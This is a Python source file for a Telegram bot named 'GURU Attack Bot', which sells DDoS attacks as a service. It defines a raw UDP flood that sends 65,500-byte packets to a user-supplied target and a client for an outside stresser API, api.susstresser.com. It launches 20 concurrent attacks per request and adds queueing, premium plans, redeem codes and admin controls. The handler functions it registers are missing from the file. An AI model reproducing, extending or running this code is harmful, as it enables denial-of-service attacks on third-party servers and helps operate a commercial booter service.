# app.py - Working on Render with all features
import os
import logging
import asyncio
import threading
import aiohttp
import time
import json
import re
import socket
import random
import string
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20
MAX_QUEUE = 50

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 GURU Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = False
        try:
            if mongo_uri:
                self.client = MongoClient(mongo_uri, serverSelectionTimeoutMS=5000)
                self.client.admin.command('ping')
                self.db = self.client["guru_bot"]
                self.users = self.db.users
                self.codes = self.db.redeem_codes
                self.logs = self.db.attack_logs
                self.admins = self.db.admins
                
                self.users.create_index("user_id", unique=True)
                self.codes.create_index("code", unique=True)
                
                for admin_id in [OWNER_ID, PSEUDO_OWNER_ID]:
                    if not self.admins.find_one({"user_id": admin_id}):
                        level = "owner" if admin_id == OWNER_ID else "pseudo_owner"
                        self.admins.insert_one({
                            "user_id": admin_id,
                            "level": level,
                            "added_at": datetime.now()
                        })
                logger.info("✅ MongoDB connected")
            else:
                raise Exception("No MongoDB URI")
        except Exception as e:
            logger.warning(f"⚠️ MongoDB failed: {e}, using in-memory")
            self.memory_mode = True
            self.users = {}
            self.codes = {}
            self.logs = []
            self.admins = {
                OWNER_ID: {"user_id": OWNER_ID, "level": "owner"},
                PSEUDO_OWNER_ID: {"user_id": PSEUDO_OWNER_ID, "level": "pseudo_owner"}
            }
    
    def add_user(self, user_id, username=None, first_name=None):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {
                    "username": username, 
                    "first_name": first_name, 
                    "last_active": datetime.now(),
                    "plan": "premium",
                    "plan_expiry": datetime.now() + timedelta(days=30),
                    "has_used_code": False
                }},
                upsert=True
            )
        else:
            if user_id not in self.users:
                self.users[user_id] = {
                    "user_id": user_id, 
                    "username": username, 
                    "first_name": first_name,
                    "plan": "premium",
                    "plan_expiry": datetime.now() + timedelta(days=30)
                }
    
    def get_user(self, user_id):
        if not self.memory_mode:
            return self.users.find_one({"user_id": user_id})
        return self.users.get(user_id)
    
    def get_user_plan(self, user_id):
        user = self.get_user(user_id)
        if not user:
            return "premium", datetime.now() + timedelta(days=30)
        
        plan = user.get("plan", "premium")
        expiry = user.get("plan_expiry")
        
        if not expiry:
            expiry = datetime.now() + timedelta(days=30)
            self.update_user_plan(user_id, "premium", expiry)
        
        if expiry and isinstance(expiry, datetime):
            if expiry < datetime.now():
                expiry = datetime.now() + timedelta(days=30)
                self.update_user_plan(user_id, "premium", expiry)
        
        return plan, expiry
    
    def update_user_plan(self, user_id, plan, expiry):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"plan": plan, "plan_expiry": expiry}}
            )
        else:
            if user_id in self.users:
                self.users[user_id]["plan"] = plan
                self.users[user_id]["plan_expiry"] = expiry
    
    def get_user_stats(self, user_id):
        if not self.memory_mode:
            return self.logs.count_documents({"user_id": user_id})
        else:
            return len([l for l in self.logs if l.get("user_id") == user_id])
    
    def get_total_attacks(self):
        if not self.memory_mode:
            return self.logs.count_documents({})
        return len(self.logs)
    
    def is_admin(self, user_id):
        if not self.memory_mode:
            return self.admins.find_one({"user_id": user_id}) is not None
        return user_id in self.admins
    
    def get_admin_level(self, user_id):
        if not self.memory_mode:
            admin = self.admins.find_one({"user_id": user_id})
            return admin.get("level") if admin else None
        return self.admins.get(user_id, {}).get("level")
    
    def is_owner_or_pseudo(self, user_id):
        level = self.get_admin_level(user_id)
        return level in ["owner", "pseudo_owner"]
    
    def add_admin(self, user_id, username, added_by):
        if not self.memory_mode:
            if self.admins.find_one({"user_id": user_id}):
                return False
            self.admins.insert_one({
                "user_id": user_id,
                "username": username,
                "level": "admin",
                "added_by": added_by,
                "added_at": datetime.now()
            })
            return True
        else:
            if user_id in self.admins:
                return False
            self.admins[user_id] = {"user_id": user_id, "level": "admin"}
            return True
    
    def remove_admin(self, user_id):
        if user_id in [OWNER_ID, PSEUDO_OWNER_ID]:
            return False
        if not self.memory_mode:
            result = self.admins.delete_one({"user_id": user_id})
            return result.deleted_count > 0
        else:
            if user_id in self.admins:
                del self.admins[user_id]
                return True
        return False
    
    def get_admins(self):
        if not self.memory_mode:
            return list(self.admins.find({}))
        return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = True
    
    def unban_user(self, user_id):
        if not self.memory_mode:
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": False, "ban_reason": None}}
            )
        elif user_id in self.users:
            self.users[user_id]["is_banned"] = False
    
    def is_banned(self, user_id):
        user = self.get_user(user_id)
        return user.get("is_banned", False) if user else False
    
    def create_code(self, code, days, created_by):
        if not self.memory_mode:
            if self.codes.find_one({"code": code}):
                return False
            self.codes.insert_one({
                "code": code,
                "access_days": days,
                "created_by": created_by,
                "created_at": datetime.now(),
                "used_by": None,
                "used_at": None,
                "is_used": False
            })
            return True
        else:
            if code in self.codes:
                return False
            self.codes[code] = {
                "code": code,
                "access_days": days,
                "created_at": datetime.now(),
                "is_used": False
            }
            return True
    
    def use_code(self, code, user_id):
        if not self.memory_mode:
            code_data = self.codes.find_one({"code": code, "is_used": False})
            if code_data:
                self.codes.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                expiry = datetime.now() + timedelta(days=code_data['access_days'])
                self.update_user_plan(user_id, "premium", expiry)
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"has_used_code": True, "code_used": code}}
                )
                return code_data
        else:
            if code in self.codes and not self.codes[code]["is_used"]:
                code_data = self.codes[code]
                code_data["is_used"] = True
                expiry = datetime.now() + timedelta(days=code_data['access_days'])
                self.update_user_plan(user_id, "premium", expiry)
                if user_id in self.users:
                    self.users[user_id]["has_used_code"] = True
                return code_data
        return None
    
    def get_codes(self, only_unused=False):
        if not self.memory_mode:
            query = {"is_used": False} if only_unused else {}
            return list(self.codes.find(query).sort("created_at", -1))
        else:
            codes = list(self.codes.values())
            if only_unused:
                codes = [c for c in codes if not c["is_used"]]
            return codes
    
    def delete_code(self, code):
        if not self.memory_mode:
            result = self.codes.delete_one({"code": code})
            return result.deleted_count > 0
        else:
            if code in self.codes:
                del self.codes[code]
                return True
        return False
    
    def log_attack(self, user_id, target, port, duration, method, status, concurrent_count=20):
        log = {
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "status": status,
            "concurrent": concurrent_count,
            "timestamp": datetime.now()
        }
        if not self.memory_mode:
            self.logs.insert_one(log)
        else:
            self.logs.append(log)
        
        user = self.get_user(user_id)
        username = user.get("username") if user else None
        first_name = user.get("first_name") if user else None
        return {
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "concurrent": concurrent_count
        }
    
    def get_all_users(self):
        if not self.memory_mode:
            return list(self.users.find({}))
        return list(self.users.values())

db = Database(MONGO_URI)

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.attack_logs = []
        self.total_attacks = 0
        self.concurrent_busy = 0
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
            if len(self.active_attacks) >= 100:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method, attack_num):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.concurrent_busy = len(self.active_attacks) + 1
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'attack_num': attack_num,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def get_stats(self):
        with self.lock:
            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
            return {
                'active': active,
                'concurrent_busy': self.concurrent_busy,
                'total': self.total_attacks,
                'max': MAX_CONCURRENT
            }
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 15:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]
                self.concurrent_busy = max(0, self.concurrent_busy - 1)

attack_manager = AttackManager()

# ===== QUEUE SYSTEM =====
class AttackQueue:
    def __init__(self):
        self.queue = []
        self.lock = threading.Lock()
    
    def add_to_queue(self, user_id, target, port, duration):
        with self.lock:
            if len(self.queue) >= MAX_QUEUE:
                return False, f"❌ Queue is full ({MAX_QUEUE} max)"
            
            user_in_queue = sum(1 for q in self.queue if q['user_id'] == user_id)
            if user_in_queue >= MAX_CONCURRENT:
                return False, f"❌ You already have {user_in_queue} attacks in queue"
            
            queue_entry = {
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'added_at': datetime.now(),
                'position': len(self.queue) + 1
            }
            self.queue.append(queue_entry)
            return True, queue_entry
    
    def get_queue_position(self, user_id):
        with self.lock:
            positions = []
            for i, q in enumerate(self.queue, 1):
                if q['user_id'] == user_id:
                    positions.append(i)
            return positions
    
    def get_queue_status(self, user_id=None):
        with self.lock:
            if user_id:
                return [q for q in self.queue if q['user_id'] == user_id]
            return self.queue
    
    def kill_switch(self):
        with self.lock:
            killed = len(self.queue)
            self.queue = []
            return killed
    
    def kill_user_attacks(self, user_id):
        with self.lock:
            killed = 0
            self.queue = [q for q in self.queue if q['user_id'] != user_id]
            return killed

attack_queue = AttackQueue()

# ===== DIRECT UDP ATTACK =====
def send_udp_direct(target, port, duration, attack_num):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        payload = b"X" * 65500
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time:
            try:
                sock.sendto(payload, (target, port))
                packets_sent += 1
                if packets_sent % 1000 == 0:
                    logger.info(f"Attack {attack_num}: Sent {packets_sent} packets")
            except:
                pass
        
        sock.close()
        return {
            "success": True,
            "attack_num": attack_num,
            "packets_sent": packets_sent,
            "method": "DIRECT_UDP"
        }
    except Exception as e:
        return {
            "success": False,
            "attack_num": attack_num,
            "error": str(e),
            "method": "DIRECT_UDP"
        }

# ===== API UDP ATTACK =====
async def send_udp_api(target, port, duration, attack_num):
    base_url = "https://api.susstresser.com/panel/api/api.php"
    
    api_formats = [
        {
            "params": {
                "key": API_KEY,
                "host": target,
                "port": port,
                "time": duration,
                "method": "udp",
                "threads": 5000,
                "pps": 5000000,
                "size": 65500
            },
            "method": "POST"
        },
        {
            "params": {
                "key": API_KEY,
                "host": target,
                "port": port,
                "time": duration,
                "method": "telegramvc"
            },
            "method": "POST"
        },
        {
            "params": {
                "key": API_KEY,
                "host": target,
                "port": port,
                "time": duration,
                "method": "udp"
            },
            "method": "GET"
        }
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    for format_data in api_formats:
        try:
            timeout = aiohttp.ClientTimeout(total=duration + 15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                
                if format_data["method"] == "POST":
                    async with session.post(base_url, data=format_data["params"], headers=headers) as response:
                        elapsed = time.time() - start_time
                        raw_response = await response.read()
                        try:
                            result_text = raw_response.decode('utf-8')
                        except:
                            result_text = raw_response.decode('utf-8', errors='ignore')
                        
                        success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
                        is_success = any(indicator in result_text for indicator in success_indicators)
                        
                        if is_success and "<form" not in result_text:
                            return {
                                "success": True,
                                "attack_num": attack_num,
                                "method": "API_POST",
                                "status": response.status,
                                "elapsed": f"{elapsed:.2f}s",
                                "response": result_text[:300]
                            }
                else:
                    async with session.get(base_url, params=format_data["params"], headers=headers) as response:
                        elapsed = time.time() - start_time
                        raw_response = await response.read()
                        try:
                            result_text = raw_response.decode('utf-8')
                        except:
                            result_text = raw_response.decode('utf-8', errors='ignore')
                        
                        success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
                        is_success = any(indicator in result_text for indicator in success_indicators)
                        
                        if is_success and "<form" not in result_text:
                            return {
                                "success": True,
                                "attack_num": attack_num,
                                "method": "API_GET",
                                "status": response.status,
                                "elapsed": f"{elapsed:.2f}s",
                                "response": result_text[:300]
                            }
                
                await asyncio.sleep(0.2)
                
        except Exception as e:
            continue
    
    return {
        "success": False,
        "attack_num": attack_num,
        "error": "All API formats failed",
        "method": "API_FAILED"
    }

# ===== 20 CONCURRENT ATTACKS =====
async def send_20_concurrent_attacks(target, port, duration):
    logger.info(f"🚀 Launching 20 concurrent attacks on {target}:{port}")
    
    tasks = []
    for i in range(1, 21):
        task = send_udp_api(target, port, duration, i)
        tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for r in results if r.get('success', False))
    
    if success_count < 5:
        logger.info("⚠️ Low API success rate, trying direct UDP...")
        failed_nums = [r['attack_num'] for r in results if not r.get('success', False)]
        direct_tasks = []
        for num in failed_nums[:10]:
            direct_tasks.append(asyncio.to_thread(send_udp_direct, target, port, duration, num))
        
        if direct_tasks:
            direct_results = await asyncio.gather(*direct_tasks)
            for dr in direct_results:
                for i, r in enumerate(results):
                    if r.get('attack_num') == dr.get('attack_num') and not r.get('success'):
                        results[i] = dr
                        if dr.get('success'):
                            success_count += 1
                        break
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "failed": len(results) - success_count,
        "results": results,
        "target": target,
        "port": port,
        "duration": duration
    }

# ===== PROCESS QUEUE =====
async def process_queue():
    while True:
        queue = attack_queue.get_queue_status()
        if queue:
            for entry in queue:
                can_start, _ = attack_manager.can_start_attack(entry['user_id'])
                if can_start:
                    with attack_queue.lock:
                        if entry in attack_queue.queue:
                            attack_queue.queue.remove(entry)
                    
                    user_id = entry['user_id']
                    target = entry['target']
                    port = entry['port']
                    duration = entry['duration']
                    
                    attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
                    result = await send_20_concurrent_attacks(target, port, duration)
                    
                    attack_manager.log_attack(
                        user_id, target, port, duration, "udp",
                        "success" if result.get('success') else "failed",
                        str(result)
                    )
                    
                    if attack_manager.active_attacks:
                        attack_id = list(attack_manager.active_attacks.keys())[-1]
                        attack_manager.stop_attack(attack_id)
                    attack_manager.cleanup()
                    
                    await asyncio.sleep(1)
        await asyncio.sleep(2)

# ===== BOT HANDLERS =====
# All handlers from the previous working version - same as before

# ===== RUN BOT =====
application = None

def run_bot():
    global application
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    loop.create_task(process_queue())
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    application = app
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("kill", kill_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callbacks - Main
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(my_queue_callback, pattern="^my_queue$"))
    app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Admin
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
    app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
    app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
    app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    app.add_handler(CallbackQueryHandler(process_delete_callback, pattern="^del_"))
    
    # Owner
    app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
    app.add_handler(CallbackQueryHandler(owner_kill_switch_callback, pattern="^owner_kill$"))
    app.add_handler(CallbackQueryHandler(owner_kill_user_callback, pattern="^owner_kill_user$"))
    app.add_handler(CallbackQueryHandler(owner_queue_status_callback, pattern="^owner_queue_status$"))
    app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
    app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
    app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
    app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
    app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
    app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
    
    # Messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_promote))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_ban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_unban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_kill_user))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ GURU Bot started on Render!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("👑 GURU ATTACK BOT - RENDER")
    print("⚡ 20x UDP CONCURRENT")
    print("💎 PREMIUM ONLY")
    print("📌 Polling Mode Enabled")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)